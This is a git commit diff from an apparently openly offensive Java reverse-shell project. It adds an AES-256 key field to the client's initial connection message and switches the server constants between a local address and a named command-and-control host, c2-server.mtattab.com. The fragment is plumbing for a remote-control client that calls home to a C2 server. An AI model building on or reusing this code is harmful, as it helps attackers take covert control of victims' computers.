adfd4124fc6fa01fb428b18535b866e855f98bcf
Mohammed Hattab <mohammedhattab97@gmail.com>
2023-12-16 21:32:50 -0500

    added encryption key

--- src/main/java/com/mtattab/reverseshell/model/InitialConnectionMessageModel.java
+++ src/main/java/com/mtattab/reverseshell/model/InitialConnectionMessageModel.java
@@ -10,15 +10,18 @@ import lombok.experimental.SuperBuilder;
 public class InitialConnectionMessageModel {
 
     private String sessionId;
+    private String aes256Key;
     private String initialMessage;
 
     @JsonCreator
     public InitialConnectionMessageModel(
             @JsonProperty("sessionId") String sessionId,
-            @JsonProperty("initialMessage") String initialMessage
+            @JsonProperty("initialMessage") String initialMessage,
+            @JsonProperty("aes256Key") String aes256Key
     ) {
         this.sessionId = sessionId;
         this.initialMessage = initialMessage;
+        this.aes256Key = aes256Key;
     }
 
 }
--- src/main/java/com/mtattab/reverseshell/util/Constants.java
+++ src/main/java/com/mtattab/reverseshell/util/Constants.java
@@ -2,12 +2,12 @@ package com.mtattab.reverseshell.util;
 
 public class Constants {
 
-//    public static  String SERVER_WEBSOCKET_URI = "ws://127.0.0.1:8070/reverseShellClients" ;
-//    public static  String SERVER_HTTP_URI = "http://127.0.0.1:8070" ;
+    public static  String SERVER_WEBSOCKET_URI = "ws://127.0.0.1:8070/reverseShellClients" ;
+    public static  String SERVER_HTTP_URI = "http://127.0.0.1:8070" ;
 //
 //
-    public static final String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients" ;
-    public static final String SERVER_HTTP_URI = "https://c2-server.mtattab.com" ;
+//    public static final String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients" ;
+//    public static final String SERVER_HTTP_URI = "https://c2-server.mtattab.com" ;
 
 
 
